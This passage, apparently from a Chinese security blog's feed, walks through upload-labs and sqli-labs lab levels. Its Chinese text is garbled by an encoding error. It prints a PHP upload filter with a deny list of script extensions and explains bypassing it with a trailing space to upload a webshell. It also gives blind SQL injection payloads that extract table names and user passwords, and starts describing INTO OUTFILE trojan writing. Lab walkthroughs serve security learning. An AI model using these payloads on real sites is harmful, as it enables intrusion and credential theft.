.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æç¤ºå’Œæºç é‡Œçš„é»‘åå•å¹¶ä¸ä¸€è‡´ï¼Œæç¤ºé‡Œå°‘äº†.htaccess<br><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code><br>+++</p></blockquote><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•</strong>;å»æ‰äº†å»é™¤ç©ºæ ¼çš„trimå‡½æ•°ï¼›</li><li>ç»•è¿‡æ–¹å¼ï¼šé€‰æ‹©åç¼€ä¸º<code>.php</code>çš„ä¸€å¥è¯ä¸Šä¼ ï¼ŒæŠ“åŒ…ååœ¨åé¢å¢åŠ ç©ºæ ¼;</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvRylt.png" alt="JvRylt.png"></p><p>ä¸Šä¼ æˆåŠŸï¼</p><p>+++</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;upload-labs&quot;&gt;&lt;a href=&quot;#upload-labs&quot; class=&quot;headerlink&quot; title=&quot;upload-labs&quot;&gt;&lt;/a&gt;upload-labs&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-9&amp;10</title>
    <link href="https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/"/>
    <id>https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/</id>
    <published>2020-04-09T00:50:00.000Z</published>
    <updated>2020-07-29T11:45:47.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰"><a href="#Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰" class="headerlink" title="Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰"></a>Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰</h2><p><img src="https://s1.ax1x.com/2020/04/09/Ghzoq0.png" alt="Ghzoq0.png"></p><p><strong>åŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼šæ­£ç¡®å»¶è¿Ÿï¼Œé”™è¯¯ä¸å»¶è¿Ÿï¼›</strong></p><p>å…·ä½“æ“ä½œä¸å¸ƒå°”å‹ç±»ä¼¼ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°sleepï¼ˆï¼‰å‡½æ•°ï¼›</p><ol><li>çˆ†åº“</li></ol><ul><li>åº“é•¿</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4p8AK.png" alt="G4p8AK.png"></p><p>æ ¹æ®æµè§ˆå™¨åˆ·æ–°çš„å»¶è¿Ÿç¨‹åº¦ï¼Œå¯ä»¥åˆ¤æ–­åº“é•¿ä¸º8ï¼›</p><p>é¡µé¢çš„å›æ˜¾å¹¶æ²¡æœ‰ä»»ä½•æŒ‡ç¤ºæ„æ€ï¼Œå³ä½¿æ˜¯é”™è¯¯çš„åˆ¤æ–­ä¹Ÿå¯è¿”å›<code>You are in.........</code>;</p><ul><li>åº“å</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),2)='se',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>çˆ†è¡¨</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if( left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'e'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªè¡¨é¦–å­—æ¯ä¸ºâ€™eâ€™;</p><ol start="3"><li>çˆ†å­—æ®µ</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="4"><li>çˆ†å†…å®¹</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'d'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>â€¦â€¦</p><p>ç”±äºè¯¥æ–¹æ³•ä¸å¸ƒå°”æŠ¥é”™å‹ç›¸ä¼¼ï¼Œåªæ˜¯ç”¨æ¥è¡¨åæ­£ç¡®çš„æ–¹å¼ä¸åŒï¼Œå› æ­¤ä¸å†èµ˜è¿°ï¼›</p><p>+++</p><h2 id="Less-10ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-åŒå¼•å·ï¼‰"><a href="#Less-10ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-åŒå¼•å·ï¼‰" class="headerlink" title="Less-10ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-åŒå¼•å·ï¼‰"></a>Less-10ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-åŒå¼•å·ï¼‰</h2><p>ä¸ç¬¬ä¹å…³å®Œå…¨ä¸€è‡´ï¼Œä»…æŠŠå•å¼•å·æ”¹ä¸ºäº†åŒå¼•å·é—­åˆå½¢å¼ï¼Œåªè¦æ›´æ”¹ä¸€ä¸‹å‚æ•°åçš„ç¬¦å·å³å¯ï¼›<br>ä¾‹ï¼šåº“é•¿</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pfun.png" alt="G4pfun.png"></p><p>sleep()å‡½æ•°æ‰§è¡Œï¼Œé¡µé¢å»¶è¿Ÿåˆ·æ–°ï¼Œåˆ¤æ–­æ­£ç¡®ï¼›<br>å› ä¸ºä¸Less-9åŸºæœ¬ä¸€è‡´ï¼Œå°±ä¸å†èµ˜è¿°ï¼›</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰&quot;&gt;&lt;a href=&quot;#Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰&quot;&gt;&lt;/a&gt;Less-9ï¼ˆGETæ–¹
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-8</title>
    <link href="https://singlemindedt.github.io/2020/04/08/sqli-labs-Page-1-Less-8/"/>
    <id>https://singlemindedt.github.io/2020/04/08/sqli-labs-Page-1-Less-8/</id>
    <published>2020-04-08T07:41:44.000Z</published>
    <updated>2020-07-29T11:59:22.575Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-8-GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·"><a href="#Less-8-GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·" class="headerlink" title="Less-8(GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·)"></a>Less-8(GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·)</h2><p><img src="https://s1.ax1x.com/2020/04/09/Gh6YrV.png" alt="Gh6YrV.png"></p><p>å¸ƒå°”å‹æ³¨å…¥ï¼šæ­£ç¡®æœ‰å›æ˜¾ï¼Œé”™è¯¯æ— å›æ˜¾ï¼Œé€å­—çˆ†ç ´ï¼›<br>åˆ©ç”¨äºŒåˆ†æ³•æé«˜çˆ†ç ´æ•ˆç‡;</p><p>è¯¥é¢˜å®Œå…¨å¯ä»¥åˆ©ç”¨ä¹‹å‰ç¬¬äº”å…³çš„ä»»ä¸€æ–¹æ³•ï¼Œè¿˜å¯ä»¥ç”¨ä¸Šä¸€å…³çš„å¯¼å…¥æœ¨é©¬æ–‡ä»¶ï¼Œæ—¢ç„¶é¢˜ç›®æœ‰æŒ‡ç¤ºé‚£å°±ç”¨å¸ƒå°”ç›²æ³¨å¥½äº†ã€‚</p><ol><li>çˆ†åº“å</li></ol><p><strong>çŒœæµ‹åº“åé•¿åº¦</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (length(database()))=8 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6UVU.png" alt="Gh6UVU.png"></p><p>æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜åº“åé•¿åº¦ä¸º8ï¼›</p><ul><li>é¦–å­—æ¯<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),1,1)&lt;'t' --+</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s1.ax1x.com/2020/04/09/Gh6tbT.png" alt="Gh6tbT.png"></p><p>æ­£å¸¸å›æ˜¾ï¼Œé¦–å­—æ¯ASCIIç å°äº<code>t</code>;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),1,1)='s' <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6JK0.png" alt="Gh6JK0.png"></p><p>æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜åº“åé¦–å­—æ¯ä¸º<code>s</code>ï¼›</p><p>é€šè¿‡æ›´æ”¹ç›¸åº”å‚æ•°ï¼Œå¯æ›´æ”¹æµ‹è¯•ä½ï¼š</p><ul><li>å…¶å®ƒä½<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),2,1)='e' <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s1.ax1x.com/2020/04/09/Gh6d54.png" alt="Gh6d54.png"></p><p>â€¦â€¦</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),1,8)='security' <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6aaF.png" alt="Gh6aaF.png"></p><p>è¯´æ˜åº“åä¸º<code>security</code>;</p><p>+++</p><ol start="2"><li>çˆ†è¡¨å<br>åˆ¤æ–­è¡¨é•¿ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>)=<span class="number">5</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s1.ax1x.com/2020/04/09/G4pk7V.png" alt="G4pk7V.png"></p><p>è¯´æ˜ï¼Œç¬¬4å¼ è¡¨çš„é•¿åº¦ä½5ï¼›</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'u'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç¬¬4å¼ è¡¨é¦–å­—æ¯ä¸ºâ€™uâ€™;<br>æ³¨ï¼šlimit(0,1)ä»0å¼€å§‹è¡¨ç¤ºé¦–ä½/ä¸ªï¼›</p><p><img src="https://s1.ax1x.com/2020/04/09/Gh6D2R.png" alt="Gh6D2R.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)=<span class="string">'s'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6BG9.png" alt="Gh6BG9.png"></p><p>æ­£å¸¸å›æ˜¾ï¼Œç¬¬2ä¸ªå­—æ¯ä¸ºâ€™sâ€™;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">5</span>)=<span class="string">'users'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4S0FU.png" alt="G4S0FU.png"></p><p>é€šè¿‡æ›´æ”¹mid(column_name,start[,length])ä¸­çš„â€™startâ€™æ¥æ”¹å˜ä½æ•°ï¼Œæœ€ç»ˆå¾—åˆ°ç¬¬4å¼ è¡¨åä¸ºâ€™usersâ€™;</p><p>+++</p><ol start="3"><li>çˆ†å­—æ®µ</li></ol><p>åˆ¤æ–­åˆ—åé•¿åº¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>)=<span class="number">8</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç¬¬5åˆ—ï¼Œåˆ—åé•¿åº¦ä¸º8ï¼›</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4SBYF.png" alt="G4SBYF.png"></p><p>æ ¹æ®é•¿åº¦ï¼ŒçŒœæµ‹åˆ—åä¸º<code>password</code>ï¼ŒéªŒè¯å¾—åˆ°æ­£å¸¸è¿”å›ï¼›</p><p>+++</p><ol start="4"><li>çˆ†å†…å®¹</li></ol><ul><li>åˆ¤æ–­é•¿åº¦ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pF00.png" alt="G4pF00.png"></p><p>å¾—åˆ°â€™passwordâ€™ä¸­ç¬¬ä¸€æ¡è®°å½•é•¿åº¦ä¸º4ï¼›</p><ul><li>é€ä¸€æµ‹è¯•å†…å®¹</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and substr((select password from users limit 0,1),1,1)=&apos;d&apos; --+</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pBHP.png" alt="G4pBHP.png"></p><p>å¾—åˆ°é¦–å­—æ¯ä¸ºdï¼›</p><p>â€¦â€¦</p><p>å¾—åˆ°è¯¥ç”¨æˆ·çš„å¯†ç ä¸ºâ€dumbâ€(å¤§å°å†™ä¸å®š);</p><p>åŒç†ï¼Œå¯é€šè¿‡å¦‚ä¸Šæ–¹æ³•å¾—åˆ°å¯¹åº”ç”¨æˆ·åã€‚ä»è€Œå¾—åˆ°ç”¨æˆ·å-å¯†ç ï¼›</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'i'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4puc9.png" alt="G4puc9.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-8-GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·&quot;&gt;&lt;a href=&quot;#Less-8-GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·&quot; class=&quot;headerlink&quot; title=&quot;Less-8(GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·)&quot;&gt;&lt;/a&gt;Less-8(GETæ–¹å¼-ç›²æ³¨-
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-7</title>
    <link href="https://singlemindedt.github.io/2020/04/06/sqli-labs-Page-1-Less-7/"/>
    <id>https://singlemindedt.github.io/2020/04/06/sqli-labs-Page-1-Less-7/</id>
    <published>2020-04-06T02:41:44.000Z</published>
    <updated>2020-08-04T08:03:55.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-7-GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string"><a href="#Less-7-GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string" class="headerlink" title="Less-7(GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string)"></a>Less-7(GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string)</h2><p><img src="https://s1.ax1x.com/2020/04/08/GRhL2d.png" alt="GRhL2d.png"></p><p>æ ¹æ®é¢˜ç›®æ„æ€ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨<code>into outfile</code>å°†æœ¨é©¬ç¨‹åºå†™å…¥æ–‡ä»¶ï¼›</p><ol><li>é¦–å…ˆï¼Œæµ‹è¯•é—­åˆidå‚æ•°<br>æ–¹æ³•è¿˜å’Œä¹‹å‰å‡ å…³ä¸€æ ·ï¼Œåœ¨idååŠ å•å¼•å·ã€åŒå¼•å·ã€æ‹¬å·ç­‰å­—ç¬¦çœ‹æ˜¯å¦æŠ¥é”™ã€‚è‹¥æŠ¥é”™åˆ™idå¾ˆå¯èƒ½æ˜¯è¯¥ç§é—­åˆæ–¹å¼ï¼Œæ¥ä¸‹æ¥å†é€šè¿‡æ·»åŠ æ³¨é‡Šç¬¦æ¥è¿›ä¸€æ­¥æµ‹è¯•æ˜¯å¦ä¸ºè¯¥ç§é—­åˆæ–¹å¼ï¼›è‹¥è¯­å¥æ­£å¸¸æ‰§è¡Œï¼Œåˆ™è¯´æ˜idç¡®ä¸ºè¯¥ç§é—­åˆæ–¹å¼ã€‚<br>ç»è¿‡æµ‹è¯•å‘ç°ï¼š<br><code>æ ¼å¼ä¸ºï¼šid=((&#39;$id&#39;))</code></li></ol><p><img src="https://s1.ax1x.com/2020/04/08/GRhbPe.png" alt="GRhbPe.png"></p><p>+++</p><ol start="2"><li>å…³äº<code>into outfile</code></li></ol><p>into outfile ä¸»è¦ç”¨äºå°†æŸ¥è¯¢å‡ºæ¥çš„ç»“æœå¯¼å‡ºåˆ°æ–‡æœ¬ä¸­;<br>ä½†æ˜¯ï¼Œä½¿ç”¨è¿˜éœ€è¦å¦‚ä¸‹æƒé™ï¼š</p><ul><li>çŸ¥é“ç‰©ç†è·¯å¾„ï¼ˆinto outfile â€˜WEBç›®å½•çš„ç‰©ç†è·¯å¾„â€™ï¼‰è¿™æ ·æ‰èƒ½å†™å¯¹ç›®å½•ã€‚ï¼ˆé»˜è®¤çš„å½“å‰ç›®å½•æ˜¯MySQLçš„æ•°æ®ç›®å½•ï¼‰</li><li>èƒ½å¤Ÿä½¿ç”¨unionï¼ˆä¹Ÿå°±æ˜¯MySQLç‰ˆæœ¬åœ¨3ä»¥ä¸Šï¼‰</li><li>æ²¡æœ‰å¯¹â€™è¿›è¡Œè¿‡æ»¤ï¼ˆå› ä¸ºoutfileåé¢çš„â€™â€™ä¸å¯ä»¥ç”¨å…¶ä»–å‡½æ•°ä»£æ›¿è½¬æ¢ï¼‰</li><li>MySQLç”¨æˆ·æ‹¥æœ‰file_privæƒé™ï¼ˆä¸ç„¶å°±ä¸èƒ½å†™æ–‡ä»¶æˆ–è€…æŠŠæ–‡ä»¶å†…å®¹è¯»å‡ºï¼‰</li><li>å¯¹webç›®å½•æœ‰å†™æƒé™ã€‚</li></ul><ol start="3"><li>å…ˆæ¥çœ‹çœ‹ç‰©ç†è·¯å¾„ï¼š</li></ol><p><code>@@basedir:mysqlå®‰è£…è·¯å¾„</code></p><p><code>@@datadir:æ•°æ®åº“è·¯å¾„</code></p><p>å°è¯•è·å–è·¯å¾„ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,@@datadir <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/08/GR4SVf.png" alt="GR4SVf.png"></p><p>æ²¡æœ‰å°†ç»“æœè¿”å›ï¼Œåº”è¯¥æ˜¯åšäº†é™åˆ¶ï¼Œè¯­æ³•æ­£ç¡®æ—¶åªè¿”å›<code>You are in.... Use outfile......</code></p><p>ç”±äºæˆ‘æ˜¯æœ¬åœ°å®‰è£…ï¼ŒçŸ¥é“è¿™ä¸€ç³»åˆ—é¢˜ç›®å‡å…¬ç”¨æ•°æ®ï¼Œè¿™é‡Œå¯ä»¥å€Ÿå‰å‡ é¢˜æŸ¥è¯¢è·¯å¾„ï¼›</p><p><img src="https://s1.ax1x.com/2020/04/08/GRh75D.png" 